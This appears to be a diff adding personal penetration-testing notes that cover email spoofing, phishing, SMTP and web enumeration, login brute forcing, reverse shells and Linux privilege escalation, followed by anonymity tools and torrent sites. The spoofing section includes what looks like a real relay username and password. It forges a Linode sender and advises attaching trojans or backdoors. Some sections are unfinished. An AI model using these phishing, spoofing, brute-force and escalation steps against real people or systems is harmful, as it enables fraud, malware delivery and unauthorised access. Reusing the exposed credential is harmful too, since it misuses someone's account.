@@ -1,0 +1,282 @@
+{/* frontmatter removed for clean UI */}
+
+## Social Engineering & Information Gathering using *Maltego* 
+pass
+
+
+*EMAIL Spoofing* Use of SendinBlue or other paid mailing services that offer SMTP servers, we can customize our email into a disguise to bypass receiving email anti-spam algorithm. In Kali we use a program called *SENDEMAIL* and check the —help to set the options.
+Syntax Ex:
+```bash
+sendemail -xu jennocrypto@aol.com -xp dHENL09TDUr2CAVs -s smtp-relay.sendinblue.com:587 -f "From Email" -t "To Email" -u "Email Subject" -m "Email Content" -o message-header="From: Allan Smith <service@linode.com>"
+```
+However if you want to attach a backdoor, trojan, virus file…You can use a service such as dropbox to deliver the file(i.e we first upload and copy it's URL for delivery purposes). Or we can send deliver it manually -a file attachment flag and `<file_path>`. Also ensure to use the advanced option -o message-header=HEADER to change the incoming message header to resemble a friendly mail.
+
+*EMAIL Spoofing2* Use of PHP mailers requires a web hosting plan, free web-hosting plan don't gives access to Mail Servers. Creating a domain with a reputable providers that has both PHP MAILERS && SMTP SERVERS is a Plus. Using a file named SEND.PHP we upload this to our domain provider user access page. Note files are served from domain to endusers using I.e www.QueryParams.com/`<file_path>`
+ 
+*EMAIL Phishing* Use of tool names BLACKEYE to create fake default landing pages or custom landing pages. It generates a link via 
+
+## Enumerating and Exploiting Vulnerabilities / MisConfiguration in SMTP
+*Enumerating Server Details
+Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "smtp_version" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.
+*Enumerating Users from SMTP
+The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users
+We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
+*Alternatives
+It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.
+
+
+Website Hacking & Attacks === https://github.com/danielmiessler/SecLists/raw/master/Discovery
+## Web-Enumeration >> Gobuster is a tool used to brute-force:  Since this tool is written in Go, you must install the Go language/compiler/etc. 
+Sudo apt install gobuster -> via apt package manager 
+go install github.com/OJ/gobuster/v3@latest -> via golang package manager
+git clone https://github.com/OJ/gobuster.git -> via Git clone Build
+    URIs (directories and files) in web sites.
+    DNS subdomains (with wildcard support).
+    Virtual Host names on target web servers.
+    Open Amazon S3 buckets
+    Open Google Cloud buckets
+    TFTP servers
+    gobuster help - outputs the top-level help.
+    `gobuster help <mode>` - outputs the help specific to that mode.
+
+Dir Mode - URIs (directories and files) in web sites
+Dirbuster has a "dir”/file Enumeration mode that allows the user to enumerate website directories. Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Let’s say We finally managed to upload our Webshell on an Upload form Now we might need to bruteforce directories in order to locate the folder where the uploaded files are stored but we can also guess it. The gobuster immediately found the /uploads directory. We don't have permission to access the directory but we can try access our uploaded file.
+```bash
+http://<TARGET_IP>/uploads/php-reverse-shell.php && nc -lvnp <PORT>
+```
+To use "dir" mode, you start by typing gobuster dir. This tells Gobuster that you want to perform a directory search, instead of one of its other methods. After that, you will need to add the URL and wordlist using the -u and -w options, respectively. With filters for file extension(-x) types.
+
+```bash
+gobuster dir -u <websiteURL> -w /usr/share/wordlists/dirbuster/directory*
+gobuster dir -u https://mysite.com/path/to/folder -c 'session=hijackedSession123456' -t 50 -w common-files.txt -x .php,.html
+```
+
+ Dns Mode - DNS subdomains (with wildcard support)
+To use "dns" subdomain enumeration mode, you start by typing ‘gobuster dns’. This tells Gobuster that you want to perform a sub-domain brute-force, After that, you will need to add the domain and wordlist using the -d and -w options, respectively. Like so:
+
+```bash
+gobuster dns -d <TargetFQDNDomain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+VHOST mode - Virtual Host names on target web servers.
+Virtual hosts are different websites on the same machine. Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. (Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.) but don't be deceived! Virtual Hosts are IP based and are running on the same server. This is not usually apparent to the end-user.
+To use "vhost" mode, you start by typing gobuster vhost. This tells Gobuster that you want to perform a virtual host brute-force. Using VHOST enumeration mode (you most probably want to use the IP address as the URL parameter). After that, you will need to add the domain and wordlist using the -u and -w options, respectively. Like so:
+
+```bash
+gobuster vhost -u http://IP/FQDN -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+s3 Mode - Uses aws bucket and GCS Mode - google cloud bucket
+```bash
+gobuster s3 -w bucket-names.txt && gobuster gcs -w bucket-names.txt
+```
+
+Fuzz Mode - Uses fuzzing mode similar to FFUF tools
+Fuzzing for PHP hard-coded parameters in WebPages PHP scripts
+Fuzzing for parameter values
+```bash
+gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt
+```
+
+## Web-Enumeration >> WPScan framework is capable of enumerating & researching a few security vulnerability categories present WordPress sites - including - but not limited to:
+1. Sensitive Information Disclosure (Plugin & Theme installation versions for disclosed vulnerabilities or CVE's)
+2. Path Discovery (Looking for misconfigured file permissions i.e. wp-config.php)
+ 3. Weak Password Policies (Password bruteforcing)
+ 4. Presence of Default Installation (Looking for default files)
+ 5. Testing Web Application Firewalls (Common WAF plugins)
+
+Before using WPScan, it is highly recommended that you update this database before performing any scans. Simply run wpscan --update 
+Enumerating for Installed Themes by using the --enumerate flag with the t 
+`wpscan --url <hostname> --enumerate t`
+Enumerating for Installed Plugins by using the --enumerate flag with the p
+`wpscan --url <hostname> --enumerate p` 
+"Directory Listing" occurs when there is no file present that the webserver has been told to process
+Enumerating for Users by using the --enumerate flag with the u
+`wpscan --url <hostname> --enumerate u` 
+The "Vulnerable" Flag
+WPScan has the v argument for the --enumerate flag. We provide this argument alongside another (such as p for plugins). For example, our syntax would like so: `wpscan --url <hostname> --enumerate vp` 
+Note, that this requires setting up WPScan to use the WPVulnDB API which is out-of-scope for this room. 
+Adjusting WPScan's Aggressiveness (WAF)
+Unless specified, WPScan will try to be as least "noisy" as possible. Lots of requests to a web server can trigger things such as firewalls and ultimately result in you being blocked by the server.
+This means that some plugins and themes may be missed by our WPScan. Luckily, we can use arguments such as --plugins-detection and an aggressiveness profile (passive/aggressive) to specify this. For example: --plugins-detection aggressive
+
+## WebServers-Enumeration >> Nikto is capable of performing an assessment on all types of webservers (and isn't application-specific such as WPScan.). Nikto can be used to discover possible vulnerabilities including:
+Sensitive files, Outdated servers and programs (i.e. vulnerable web server installs), Common server and software misconfigurations (Directory indexing, cgi scripts, x-ss protections)
+
+Basic Scanning `nikto -h <vulnerable_ip>`
+This scan type will retrieve the headers advertised by the webserver or application (I.e. Apache2, Apache Tomcat, Jenkins or JBoss) and will look for any sensitive files or directories (i.e. login.php, /admin/, etc)
+canning Multiple Hosts & Ports
+
+Parsing Nmap output to Nikto >> nmap -p80 hostname/24 -oG - | nikto -h - 
+Scanning Several Ports on a Host >> nikto -h vulnerable_ip -p 80,8000,8080
+Choosing plugins that are appropriate to our target using -Plugin flag. You can use the --list-plugins flag with Nikto to list the plugins, Some interesting plugins include: 
+
+apacheusers  Attempt to enumerate Apache HTTP Authentication Users
+cgi	Look for CGI scripts that we may be able to exploit
+robots	Analyse the robots.txt file which dictates what files/folders we are able to navigate to
+dir_traversal Attempt to use a directory traversal attack (i.e. LFI) to look for system files such as /etc/passwd on Linux (http://ip_address/application.php?view=../../../../../../../etc/passwd)
+We can increase the verbosity of our Nikto scan by providing the following arguments with the -Display flag. 
+1	Show any redirects that are given by the web server. 	
+2	Show any cookies received 	E	Output any errors	
+
+Tuning Your Scan for Vulnerability Searching
+Nikto has several categories of vulnerabilities that we can specify our scan to enumerate and test for.  We can use the -Tuning flag and provide a value in our Nikto scan.
+
+## ServerMessageBlock (SMB)-Enumeration >> 
+Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
+Samba is based on the common client/server protocol of Server Message Block (SMB). 
+*Enum4linux is a tool for enumerating information from Windows and Samba systems. It is written in PERL and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. The samba package is therefore a dependency.
+
+*Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!
+i.e `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target-IP>`
+￼
+
+Bypassing Client-Side Filtering : There are four easy ways to bypass your average client-side file upload filter https://tryhackme.com/room/uploadvulns#
+
+“Turn off Javascript in your browser” -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
+“Intercept and modify the incoming page”. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. 
+“Intercept and modify the file upload” Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). 
+"Send the file directly to the upload point". Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. The syntax for such a command would look something like this: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command
+
+Bypassing Server-Side Filtering: Either by Manipulating File Extensions or Magic Numbers(The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist) 
+
+Magic Number validation: Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: 89 50 4E 47 0D 0A 1A 0A.
+
+## Authentication Bypass
+We can use the existence of this error message(an account with this username already exists.) to produce a list of valid usernames already signed up on a website by using the FFUF tool below. The FFUF tool uses a list of commonly used usernames to check against for any matches.
+
+```bash
+ffuf -w /usr/share/wordlists/SecLists/…..txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<URL> -mr "username already exists"
+```
+
+In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.
+
+>> Brute-Forcing the Login
+```bash
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<URL> -fc 200
+```
+Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.
+
+
+## Linux Privilege Escalation
+The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.
+Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
+LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh 
+“As LinEnum is for Linux, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations."
+Also winPeas.Bat https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat for windows enumeration
+How do you get LinEnum on the target machine? Either through Python dedicated web server or copy & pasting the code via Nano/Vim Editor on Target Machine, Note: change permissions of this file using chmod +x allow file to be executable
+
+Horizontal Privilege Escalation >> Occurs when a user can perform an action or access data of another user with the same level of permissions.
+Vertical Privilege Escalation >> Occurs when a user can perform an action or access data of another user with a higher level of permissions.
+Note: “Binary exploits of a root owned program are far less dangerous than a kernel exploit because even if the service crashes, the host machine will not crash and the services will probably auto restart.’
+
+1. Abusing SUID/GUID Files (Set owner User ID up on execution) is a special type of file permissions given to a file. The Set User ID (SUID) allows a user to run a program as the owner of the program file rather than as themselves. If this is root, it runs with root permissions. It can allow us to escalate privileges. The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges! SGID (Set Group ID)
+*Manually Finding SUID Binaries
+We can enumerate SUID capable files on the target system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: "find / -perm -u=s -type f 2>/dev/null" to search the file system for SUID/GUID files. Let's break down this command.
+This permission bit is the SUID, when a file has this permission set, it allows the users who launched the program to get the file owner's permission as well as execution permission, in this case root. 
+Just like regular permissions there are two ways to modify SUID & SGID permissions.
+Symbolic way: >> $ sudo chmod u+s myfile $ sudo chmod g+s myfile
+Numerical way: >> sudo chmod 4755 myfile  $ sudo chmod 2555 myfile
+As you can see the SUID is denoted by a 4 and pre-pended to the permission set. You may see the SUID denoted as a capital S this means that it still does the same thing, but it does not have execute permissions.
+Similar to the set user ID permission bit, there is a set group ID (SGID) permission bit. This bit allows a program to run as if it was a member of that group
+One last special permission bit I want to talk about is the sticky bit.
+This permission bit, "sticks a file/directory" this means that only the owner or the root user can delete or modify the file. This is very useful for shared directories
+You'll see a special permission bit at the end here t, this means everyone can add files, write files, modify files in the /tmp directory, but only root can delete the /tmp directory.
+Modify sticky bit
+$ sudo chmod +t mydir
+$ sudo chmod 1755 mydir
+The numerical representation for the sticky bit is 1
+
+2. Exploiting a writable /etc/passwd
+It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!
+
+3.The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute. We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
+
+4.Exploiting PATH Variable Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead! As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root! BE sure you can answer the questions below before trying this.
+
+    What folders are located under $PATH
+    Does your current user have write privileges for any of these folders?
+    Can you modify $PATH?
+    Is there a script/application you can start that will be affected by this vulnerability?
+
+5.Exploiting misconfigured SUDO rights to get root access
+sudo -l >> Prints the commands which we are allowed to run as SUDO
+
+The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
+The Kernel exploit methodology is simple;
+    Identify the kernel version
+    Search and find an exploit code for the kernel version of the target system
+    Run the exploit 
+
+Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit. 
+
+✅Information Gathering of Target website such as *IP address, Domain Name info, Technologies used, other website on the same server, DNS records, Unlisted files//sub-domains//directories* 
+https://whois.domaintools.com, https://toolbar.netcraft.com, https://www.robtex.com
+One server can serve a number of websites, gaining access to one can help gaining access to others. If any is compromised, we can penetrate and gain proper access to the other websites. Likewise, a Website may have subdomains….finding vulnerabilities in this subdomains i.e Discover more information, New Web Applications, Management areas, Beta/Experimental features increases the attack surface… This discoveries can be made using a tools named *KNOCKPY*.
+
+✅Preventing M_I_T_M Attack ➡️ Download XARP tools, Analyzing ARP tables & Wireshark to detect ARP poisioning. However detection is not the same was prevention. Solutions
+1. Encrypt Your Traffic Using VPN (extra layer of encryption)
+2. Https everywhere Plugins && Several other blockers
+
+✅*For more ANONYMITY https://tails.boum.org/index.en.html 	https://geti2p.net/en/
+Use *TORCTL* Terminal commands to operate Torctl: Enter any of the following commands in the Terminal and press Enter to operate Torctl::
+Display list of commands: torctl --help
+Find your IP address: torctl ip
+Start Torctl and start routing traffic: sudo torctl start
+Stop Torctl: sudo torctl stop
+Check Torctl status: torctl status
+Change your IP address on the Tor Network: sudo torctl chngid
+Change MAC address: sudo torctl chngmac
+Recover original MAC address: sudo torctl rvmac
+Automatically start Torctl on startup: sudo systemctl enable torctl-autostart.service
+Remove auto Torctl from startup services: sudo systemctl disable torctl-autostart.service
+Add automatic memory cleaning when you shut down your computer: sudo systemctl enable torctl-autowipe.service
+Disable automatic memory cleaning: sudo systemctl disable torctl-autowipe.service
+
+✅Kali Whoami status: The purpose of the Whoami tool makes you as anonymous as possible on Kali linux. It is an user friendly with its ease of use and simple interface. It follows two different paths to ensure the highest possible level of anonymity. Finally, don't forget that there is never a hundred percent security on the internet! *Kali-whoami start*
+ Anti Mitm             : Disable
+ Ip changer            : Disable
+ Dns changer           : Disable
+ Mac changer           : Disable
+ Timezone changer      : Disable
+ Hostname changer      : Disable
+ Browser anonymization : Disable
+https://dnsleak.com/
+Extra Anonymity with Proxies. https://proxy-seller.ru/ 
+
+✅Installing Kali/Tools on the cloud
+Watch https://www.youtube.com/watch?v=111ZDMKVTL4
+
+✅PREVENTION malicious downloads using MD5 https://www.winmd5.com/md5_software.html
+However this won’t work if the website you’re downloading from is intentional serving you a malicious software with backdoor in which they can manipulate the checksum. Analyzing trojans using online sandbox I.E https://www.hybrid-analysis.com/
+
+
+
+### Wordlists Links
+ftp://ftp.openwall.com/pub/wordlists/
+http://www.openwall.com/mirrors/
+http://www.outpost9.com/files/WordLists.html
+http://www.vulnerabilityassessment.co.uk/passwords.htm
+http://packetstormsecurity.org/Crackers/wordlists/
+http://www.ai.uga.edu/ftplib/natural-language/moby/
+http://www.cotse.com/tools/wordlists1.htm
+http://www.cotse.com/tools/wordlists2.htm
+http://wordlist.sourceforge.net/
+Torrent Website
+1337x.to
+rarbg.to
+nyaa.si
+limetorrents.info
+zooqle.com
+katcr.co
+torrentdownloads.me
+magnetdl.com
+torlock.com
+pcgamestorrents.com
+torrentgalaxy.org
+ettv.tv
+torrentfunk.com
+btdig.com
+yourbittorrent.com
+monova.org
+idope.se
